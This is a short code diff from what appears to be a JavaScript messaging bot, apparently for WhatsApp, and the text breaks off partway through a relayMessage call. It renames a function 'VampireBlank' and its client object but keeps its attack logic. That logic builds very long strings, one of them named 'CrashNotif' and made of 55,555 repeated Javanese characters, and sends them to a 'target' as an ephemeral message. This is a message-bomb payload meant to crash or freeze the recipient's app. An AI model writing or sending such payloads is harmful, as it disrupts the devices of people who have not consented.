@@ -28,11 +28,11 @@ function botInfo() {
 }
 
 
-async function VampireBlank(target, ptcp = true) {
+async function vampireBlank(target, ptcp = true) {
   const Vampire = `_*~@8~*_\n`.repeat(10500);
   const CrashNotif = 'ꦽ'.repeat(55555);
 
-  await gulbat.relayMessage(
+  await axiom.relayMessage(
     target,
     {
       ephemeralMessage: {
